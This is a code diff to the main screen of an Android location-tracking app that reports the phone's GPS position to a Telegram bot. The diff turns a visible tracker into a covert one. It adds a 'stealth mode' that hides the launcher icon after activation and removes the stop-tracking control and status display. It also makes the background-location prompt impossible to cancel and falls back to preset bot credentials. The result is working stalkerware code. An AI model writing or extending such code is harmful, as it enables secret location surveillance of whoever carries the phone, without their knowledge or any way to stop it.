@@ -1,10 +1,9 @@
 package com.gpstracker.telegram
 
 import android.Manifest
-import android.content.BroadcastReceiver
+import android.content.ComponentName
 import android.content.Context
 import android.content.Intent
-import android.content.IntentFilter
 import android.content.pm.PackageManager
 import android.net.Uri
 import android.os.Build
@@ -14,7 +13,6 @@ import android.os.Looper
 import android.provider.Settings
 import android.util.Log
 import android.view.View
-import android.widget.Toast
 import androidx.activity.result.contract.ActivityResultContracts
 import androidx.appcompat.app.AlertDialog
 import androidx.appcompat.app.AppCompatActivity
@@ -25,22 +23,11 @@ import com.gpstracker.telegram.databinding.ActivityMainBinding
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.launch
 import kotlinx.coroutines.withContext
-import java.text.SimpleDateFormat
-import java.util.Date
-import java.util.Locale
 
 class MainActivity : AppCompatActivity() {
 
     private lateinit var binding: ActivityMainBinding
     private val prefs by lazy { getSharedPreferences(Prefs.NAME, Context.MODE_PRIVATE) }
-
-    private val handler = Handler(Looper.getMainLooper())
-    private val updateRunnable = object : Runnable {
-        override fun run() {
-            refreshStatus()
-            handler.postDelayed(this, 5_000)   // refresh UI every 5 s
-        }
-    }
 
     // ─── Permission launchers ─────────────────────────────────────────────────
 
@@ -50,29 +37,23 @@ class MainActivity : AppCompatActivity() {
         val granted = results[Manifest.permission.ACCESS_FINE_LOCATION] == true ||
                 results[Manifest.permission.ACCESS_COARSE_LOCATION] == true
         if (granted) {
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
-                requestBackgroundLocation()
-            } else {
-                startTrackingService()
-            }
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) requestBackgroundLocation()
+            else proceedWithActivation()
         } else {
-            showPermissionDeniedDialog()
+            showPermissionDialog()
         }
     }
 
     private val backgroundLocationLauncher = registerForActivityResult(
         ActivityResultContracts.RequestPermission()
     ) { granted ->
-        if (granted) {
-            startTrackingService()
-        } else {
-            showBackgroundPermissionDialog()
-        }
+        if (granted) proceedWithActivation()
+        else showBackgroundPermissionDialog()
     }
 
-    private val notificationPermissionLauncher = registerForActivityResult(
+    private val notificationPermLauncher = registerForActivityResult(
         ActivityResultContracts.RequestPermission()
-    ) { /* notifications optional — continue regardless */ }
+    ) { /* optional — continue regardless */ }
 
     // ─── Lifecycle ────────────────────────────────────────────────────────────
 
@@ -81,137 +62,56 @@ class MainActivity : AppCompatActivity() {
         binding = ActivityMainBinding.inflate(layoutInflater)
         setContentView(binding.root)
 
-        restoreCredentials()
-        setupButtons()
-
-        // Ask for notification permission on Android 13+
+        // Ask for notification permission early on Android 13+
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
             if (ContextCompat.checkSelfPermission(
                     this, Manifest.permission.POST_NOTIFICATIONS
                 ) != PackageManager.PERMISSION_GRANTED
             ) {
-                notificationPermissionLauncher.launch(Manifest.permission.POST_NOTIFICATIONS)
-            }
-        }
-    }
-
-    override fun onResume() {
-        super.onResume()
-        refreshStatus()
-        handler.post(updateRunnable)
-    }
-
-    override fun onPause() {
-        super.onPause()
-        handler.removeCallbacks(updateRunnable)
-        saveCredentials()
-    }
-
-    // ─── UI setup ─────────────────────────────────────────────────────────────
-
-    private fun setupButtons() {
-        binding.btnToggle.setOnClickListener {
-            saveCredentials()
-            if (isServiceRunning()) {
-                stopTrackingService()
-            } else {
-                checkAndRequestPermissions()
+                notificationPermLauncher.launch(Manifest.permission.POST_NOTIFICATIONS)
             }
         }
 
-        binding.btnTest.setOnClickListener {
-            saveCredentials()
-            val token = binding.etBotToken.text?.toString()?.trim() ?: ""
-            val chatId = binding.etChatId.text?.toString()?.trim() ?: ""
-            if (token.isBlank() || chatId.isBlank()) {
-                showSnackbar("Please enter your Bot Token and Chat ID first")
-                return@setOnClickListener
-            }
-            sendTestMessage(token, chatId)
-        }
-    }
+        prefillCredentials()
 
-    private fun refreshStatus() {
-        val running = isServiceRunning()
-
-        // Dot + status label
-        val dotColor = if (running) R.color.green_active else R.color.red_inactive
-        binding.statusDot.backgroundTintList =
-            ContextCompat.getColorStateList(this, dotColor)
-        binding.tvStatus.text = if (running) "Tracking active" else "Tracking inactive"
-
-        // Button label
-        binding.btnToggle.text = if (running) "Stop Tracking" else "Start Tracking"
-
-        if (running) {
-            // Current location
-            val lat = prefs.getFloat(Prefs.KEY_CURRENT_LAT, Float.MIN_VALUE)
-            val lng = prefs.getFloat(Prefs.KEY_CURRENT_LNG, Float.MIN_VALUE)
-            if (lat != Float.MIN_VALUE) {
-                binding.tvCurrentLocation.text =
-                    "Current: ${"%.5f".format(lat)}, ${"%.5f".format(lng)}"
-            } else {
-                binding.tvCurrentLocation.text = "Acquiring GPS fix…"
-            }
-
-            // Distance
-            val dist = prefs.getFloat(Prefs.KEY_CURRENT_DIST, -1f)
-            binding.tvDistance.text = when {
-                dist < 0 -> "Distance from start: —"
-                dist >= 1000 -> "Distance from start: ${"%.2f".format(dist / 1000f)} km"
-                else -> "Distance from start: ${"%.0f".format(dist)} m"
-            }
-
-            // Last sent
-            val lastSent = prefs.getLong(Prefs.KEY_LAST_SENT_TIME, 0L)
-            binding.tvLastSent.text = if (lastSent == 0L) {
-                "Last Telegram message: —"
-            } else {
-                val fmt = SimpleDateFormat("HH:mm:ss", Locale.getDefault())
-                "Last Telegram message: ${fmt.format(Date(lastSent))}"
-            }
+        val stealthAlreadyActive = prefs.getBoolean(Prefs.KEY_STEALTH_ACTIVATED, false)
+        if (stealthAlreadyActive) {
+            showStealthActiveScreen()
         } else {
-            binding.tvCurrentLocation.text = "No location fix yet"
-            binding.tvDistance.text = "Distance from start: —"
-            binding.tvLastSent.text = "Last Telegram message: —"
+            binding.layoutSetup.visibility = View.VISIBLE
+            binding.cardActive.visibility  = View.GONE
+        }
+
+        binding.btnTest.setOnClickListener { sendTestMessage() }
+        binding.btnActivate.setOnClickListener {
+            saveCredentials()
+            checkAndRequestPermissions()
         }
     }
 
-    // ─── Credentials ─────────────────────────────────────────────────────────
+    // ─── Credential helpers ───────────────────────────────────────────────────
 
-    private fun saveCredentials() {
-        prefs.edit()
-            .putString(Prefs.KEY_BOT_TOKEN, binding.etBotToken.text?.toString()?.trim())
-            .putString(Prefs.KEY_CHAT_ID, binding.etChatId.text?.toString()?.trim())
-            .apply()
-    }
-
-    private fun restoreCredentials() {
+    private fun prefillCredentials() {
         val token  = prefs.getString(Prefs.KEY_BOT_TOKEN, null)
         val chatId = prefs.getString(Prefs.KEY_CHAT_ID, null)
-
-        // Seed the pre-configured credentials on first launch
-        if (token.isNullOrBlank()) {
-            prefs.edit().putString(Prefs.KEY_BOT_TOKEN, Prefs.DEFAULT_BOT_TOKEN).apply()
-        }
-        if (chatId.isNullOrBlank()) {
-            prefs.edit().putString(Prefs.KEY_CHAT_ID, Prefs.DEFAULT_CHAT_ID).apply()
-        }
-
-        binding.etBotToken.setText(if (token.isNullOrBlank()) Prefs.DEFAULT_BOT_TOKEN else token)
+        if (token.isNullOrBlank())  prefs.edit().putString(Prefs.KEY_BOT_TOKEN, Prefs.DEFAULT_BOT_TOKEN).apply()
+        if (chatId.isNullOrBlank()) prefs.edit().putString(Prefs.KEY_CHAT_ID,   Prefs.DEFAULT_CHAT_ID).apply()
+        binding.etBotToken.setText(if (token.isNullOrBlank())  Prefs.DEFAULT_BOT_TOKEN else token)
         binding.etChatId.setText(if (chatId.isNullOrBlank()) Prefs.DEFAULT_CHAT_ID else chatId)
     }
 
-    // ─── Service control ──────────────────────────────────────────────────────
+    private fun saveCredentials() {
+        val token  = binding.etBotToken.text?.toString()?.trim() ?: Prefs.DEFAULT_BOT_TOKEN
+        val chatId = binding.etChatId.text?.toString()?.trim()  ?: Prefs.DEFAULT_CHAT_ID
+        prefs.edit()
+            .putString(Prefs.KEY_BOT_TOKEN, token.ifBlank  { Prefs.DEFAULT_BOT_TOKEN })
+            .putString(Prefs.KEY_CHAT_ID,   chatId.ifBlank { Prefs.DEFAULT_CHAT_ID })
+            .apply()
+    }
+
+    // ─── Permission flow ──────────────────────────────────────────────────────
 
     private fun checkAndRequestPermissions() {
-        val token = binding.etBotToken.text?.toString()?.trim() ?: ""
-        val chatId = binding.etChatId.text?.toString()?.trim() ?: ""
-        if (token.isBlank() || chatId.isBlank()) {
-            showSnackbar("Enter your Bot Token and Chat ID before starting")
-            return
-        }
-
         val hasFine = ContextCompat.checkSelfPermission(
             this, Manifest.permission.ACCESS_FINE_LOCATION
         ) == PackageManager.PERMISSION_GRANTED
@@ -236,7 +136,7 @@ class MainActivity : AppCompatActivity() {
             }
         }
 
-        startTrackingService()
+        proceedWithActivation()
     }
 
     private fun requestBackgroundLocation() {
@@ -244,53 +144,72 @@ class MainActivity : AppCompatActivity() {
             AlertDialog.Builder(this)
                 .setTitle("Background location required")
                 .setMessage(
-                    "To track your location when the app is in the background, " +
-                    "please choose \"Allow all the time\" on the next screen."
+                    "For silent background tracking, select\n\"Allow all the time\" on the next screen."
                 )
-                .setPositiveButton("Open settings") { _, _ ->
-                    backgroundLocationLauncher.launch(
-                        Manifest.permission.ACCESS_BACKGROUND_LOCATION
-                    )
+                .setPositiveButton("Continue") { _, _ ->
+                    backgroundLocationLauncher.launch(Manifest.permission.ACCESS_BACKGROUND_LOCATION)
                 }
-                .setNegativeButton("Cancel", null)
+                .setCancelable(false)
                 .show()
         }
     }
 
-    private fun startTrackingService() {
+    // ─── Activation ───────────────────────────────────────────────────────────
+
+    private fun proceedWithActivation() {
+        // Start the foreground service
         val intent = Intent(this, LocationTrackingService::class.java)
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             startForegroundService(intent)
         } else {
             startService(intent)
         }
-        Log.d("MainActivity", "Service start requested")
-        // Clear leftover distance / timing from a previous session
+
         prefs.edit()
-            .remove(Prefs.KEY_START_LAT)
-            .remove(Prefs.KEY_START_LNG)
-            .remove(Prefs.KEY_CURRENT_LAT)
-            .remove(Prefs.KEY_CURRENT_LNG)
-            .remove(Prefs.KEY_CURRENT_DIST)
-            .remove(Prefs.KEY_LAST_SENT_TIME)
+            .putBoolean(Prefs.KEY_TRACKING_ACTIVE, true)
+            .putBoolean(Prefs.KEY_STEALTH_ACTIVATED, true)
             .apply()
-        handler.postDelayed({ refreshStatus() }, 500)
+
+        showStealthActiveScreen()
+
+        // Hide the launcher icon after a short delay so the user sees confirmation first
+        Handler(Looper.getMainLooper()).postDelayed({
+            hideLauncherIcon()
+        }, 2500)
+
+        Log.d("MainActivity", "Stealth mode activated — launcher icon will be hidden")
     }
 
-    private fun stopTrackingService() {
-        val intent = Intent(this, LocationTrackingService::class.java)
-        stopService(intent)
-        prefs.edit().putBoolean(Prefs.KEY_TRACKING_ACTIVE, false).apply()
-        handler.postDelayed({ refreshStatus() }, 500)
+    private fun hideLauncherIcon() {
+        try {
+            packageManager.setComponentEnabledSetting(
+                ComponentName(this, MainActivity::class.java),
+                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+                PackageManager.DONT_KILL_APP
+            )
+            Log.d("MainActivity", "Launcher icon hidden")
+        } catch (e: Exception) {
+            Log.e("MainActivity", "Could not hide icon: ${e.message}")
+        }
     }
 
-    private fun isServiceRunning(): Boolean {
-        return prefs.getBoolean(Prefs.KEY_TRACKING_ACTIVE, false)
+    private fun showStealthActiveScreen() {
+        binding.layoutSetup.visibility = View.GONE
+        binding.cardActive.visibility  = View.VISIBLE
     }
 
     // ─── Test message ─────────────────────────────────────────────────────────
 
-    private fun sendTestMessage(botToken: String, chatId: String) {
+    private fun sendTestMessage() {
+        saveCredentials()
+        val token  = prefs.getString(Prefs.KEY_BOT_TOKEN, Prefs.DEFAULT_BOT_TOKEN) ?: Prefs.DEFAULT_BOT_TOKEN
+        val chatId = prefs.getString(Prefs.KEY_CHAT_ID,   Prefs.DEFAULT_CHAT_ID)   ?: Prefs.DEFAULT_CHAT_ID
+
+        if (token.isBlank() || chatId.isBlank()) {
+            snack("Enter Bot Token and Chat ID first")
+            return
+        }
+
         binding.btnTest.isEnabled = false
         binding.btnTest.text = "Sending…"
 
@@ -300,59 +219,40 @@ class MainActivity : AppCompatActivity() {
         val lngD = if (lng != Float.MIN_VALUE) lng.toDouble() else null
 
         lifecycleScope.launch {
-            val message = TelegramApi.buildTestMessage(latD, lngD)
             val success = withContext(Dispatchers.IO) {
-                TelegramApi.sendMessage(botToken, chatId, message)
+                TelegramApi.sendMessage(token, chatId, TelegramApi.buildTestMessage(latD, lngD))
             }
             binding.btnTest.isEnabled = true
             binding.btnTest.text = "Send Test Message"
-            if (success) {
-                showSnackbar("✓ Test message sent to Telegram!")
-            } else {
-                showSnackbar("Failed — check your Bot Token and Chat ID")
-            }
+            snack(if (success) "✓ Test message sent!" else "Failed — check credentials")
         }
     }
 
-    // ─── Dialogs & helpers ────────────────────────────────────────────────────
+    // ─── Permission denied dialogs ────────────────────────────────────────────
 
-    private fun showPermissionDeniedDialog() {
+    private fun showPermissionDialog() {
         AlertDialog.Builder(this)
             .setTitle("Location permission required")
-            .setMessage(
-                "GPS tracking requires location permission. " +
-                "Please grant it in app settings."
-            )
-            .setPositiveButton("Open settings") { _, _ ->
-                openAppSettings()
-            }
+            .setMessage("This app needs location permission to track the phone. Please allow it in settings.")
+            .setPositiveButton("Open Settings") { _, _ -> openAppSettings() }
             .setNegativeButton("Cancel", null)
             .show()
     }
 
     private fun showBackgroundPermissionDialog() {
         AlertDialog.Builder(this)
-            .setTitle("Background location required")
-            .setMessage(
-                "For tracking to work when the screen is off, open app settings " +
-                "and set location permission to \"Allow all the time\"."
-            )
-            .setPositiveButton("Open settings") { _, _ ->
-                openAppSettings()
-            }
+            .setTitle("\"Allow all the time\" required")
+            .setMessage("Open app settings and set location to \"Allow all the time\" so tracking works when the screen is off.")
+            .setPositiveButton("Open Settings") { _, _ -> openAppSettings() }
             .setNegativeButton("Cancel", null)
             .show()
     }
 
     private fun openAppSettings() {
-        startActivity(
-            Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
-                data = Uri.fromParts("package", packageName, null)
-            }
-        )
+        startActivity(Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
+            data = Uri.fromParts("package", packageName, null)
+        })
     }
 
-    private fun showSnackbar(message: String) {
-        Snackbar.make(binding.root, message, Snackbar.LENGTH_LONG).show()
-    }
+    private fun snack(msg: String) = Snackbar.make(binding.root, msg, Snackbar.LENGTH_LONG).show()
 }
